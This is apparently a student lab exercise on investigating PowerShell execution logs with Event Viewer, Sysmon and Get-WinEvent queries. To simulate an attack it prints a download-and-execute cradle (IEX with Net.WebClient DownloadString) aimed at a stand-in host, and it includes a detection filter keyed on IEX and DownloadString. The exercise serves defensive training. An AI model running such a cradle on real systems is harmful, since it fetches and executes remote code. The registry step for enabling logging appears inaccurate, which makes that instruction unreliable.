# **Task #3: Investigate PowerShell Command Execution Logs**

## **Objective**  
The objective of this task is to help students analyze **PowerShell execution logs** to detect potential malicious activity. By completing this task, students will learn how to capture **PowerShell command execution events**, detect suspicious script execution, and analyze logs using **Windows Event Viewer and PowerShell**.

---

## **Lab Setup**  
### **Requirements**  
- **System:** Windows 10/11 or Windows Server 2019/2022  
- **Tools Required:**  
  - **PowerShell** (Pre-installed on Windows)  
  - **Windows Event Viewer**  
  - **Sysmon (System Monitor) from Sysinternals**  

---

## **Preparation**  
### **Step 1: Enable PowerShell Logging**  
To ensure PowerShell activity is being logged, enable **Script Block Logging**:  

1. Open **PowerShell (Run as Administrator)** and run:  
   ```powershell
   Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force
   ```
2. Enable logging for PowerShell script blocks:
```
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name ScriptBlockLogging -Value 1 -PropertyType DWord
```

## Attack Simulation & Detection
We will now simulate the execution of a suspicious PowerShell command, detect it using Event Viewer, and analyze logs with Sysmon.

### Step 1: Simulate a Suspicious PowerShell Command Execution
1. Open PowerShell (Run as Administrator).
2. Run the following potentially malicious command:
```
IEX (New-Object Net.WebClient).DownloadString("http://malicious-site.com/malware.ps1")
```
- This command attempts to download and execute a remote PowerShell script, a common technique used by attackers.
- If running in a safe lab environment, replace the URL with a harmless text file.

### Step 2: Detect PowerShell Command Execution in Windows Event Viewer
1. Open Event Viewer (Win + R, type eventvwr.msc, press Enter).
2. Navigate to:
```
Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
```
3. Click Filter Current Log and enter Event ID 4104 (Script Block Logging).
4. Look for:
- Executed Command: IEX (New-Object Net.WebClient)...
- Source Process: powershell.exe
- User Account: The account that executed the script

### Step 3: Detect PowerShell Command Execution Using Sysmon Logs
1. Open Event Viewer and navigate to:
```
Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
```
2. Click Filter Current Log and enter Event ID 1 (Process Creation).
3. Look for:
- Process Name: `powershell.exe`
- Command Line Arguments: The executed PowerShell command
- Network Connections (if applicable)

### Step 4: Retrieve PowerShell Execution Logs Using PowerShell
Instead of using Event Viewer, use PowerShell to extract logs:

**Check for PowerShell Script Block Logging (Event ID 4104)**
```
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- This retrieves all PowerShell script block execution logs.

**Check for PowerShell Process Execution via Sysmon (Event ID 1)**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 1 -and $_.Message -like "*powershell.exe*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- This extracts all PowerShell-related process execution logs.

### Step 5: Investigate Potential Remote Code Execution (RCE)
To detect suspicious PowerShell activity related to remote script execution, use:

```
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Message -like "*IEX*" -or $_.Message -like "*DownloadString*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- If results appear, it suggests a PowerShell command attempted to fetch and execute remote scripts.

## Conclusion
✅ Successfully simulated a suspicious PowerShell command execution.    
✅ Detected and analyzed PowerShell script execution logs using Event Viewer and Sysmon.     
✅ Identified remote code execution attempts, a common technique used by malware and attackers.    
✅ Learned how SOC analysts track PowerShell-based attacks and prevent execution of malicious scripts.    

## Submission
Share a screenshot of Sysmon or PowerShell logs showing script execution (Event ID 4104 or Event ID 1).
Write a short observation on how PowerShell logging helps in detecting fileless malware attacks.
